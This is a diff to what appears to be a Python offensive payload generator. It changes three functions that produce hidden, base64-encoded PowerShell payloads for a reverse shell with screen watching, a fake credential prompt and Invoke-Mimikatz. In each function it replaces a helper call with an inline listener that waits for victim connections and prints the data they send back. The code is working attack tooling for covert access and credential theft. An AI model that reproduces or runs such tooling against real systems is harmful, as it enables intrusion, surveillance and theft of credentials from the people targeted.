@@ -121,7 +121,21 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
-    startBindListener(int(portnum),useProxy=True)
+    from listener import Server
+    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
+    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker.setDaemon(True)
+    listenerworker.start()
+    print 'waiting for connection...\nCTRL + C when done\n'
+    while not listenerserver.handlers:
+        time.sleep(0.5)
+    while True:
+        try:
+            if listenerserver.handlers[1].in_buffer:
+                print listenerserver.handlers[1].in_buffer.pop()
+        except KeyboardInterrupt:
+            break
+            listenerserver.stop()
     return "pass"
 
 
@@ -132,8 +146,22 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
-    startBindListener(int(portnum),useProxy=False)
-    return "clear"
+    from listener import Server
+    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
+    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker.setDaemon(True)
+    listenerworker.start()
+    print 'waiting for connection...\nCTRL + C when done\n'
+    while not listenerserver.handlers:
+        time.sleep(0.5)
+    while True:
+        try:
+            if listenerserver.handlers[1].in_buffer:
+                print listenerserver.handlers[1].in_buffer.pop()
+        except KeyboardInterrupt:
+            break
+            listenerserver.stop()
+    return "pass"
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
@@ -142,5 +170,19 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
-    startBindListener(int(portnum),useProxy=False)
+    from listener import Server
+    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
+    listenerworker = Thread(target=asyncore.loop, args=(0.1,))
+    listenerworker.setDaemon(True)
+    listenerworker.start()
+    print 'waiting for connection...\nCTRL + C when done\n'
+    while not listenerserver.handlers:
+        time.sleep(0.5)
+    while True:
+        try:
+            if listenerserver.handlers[1].in_buffer:
+                print listenerserver.handlers[1].in_buffer.pop()
+        except KeyboardInterrupt:
+            break
+            listenerserver.stop()
     return "pass"
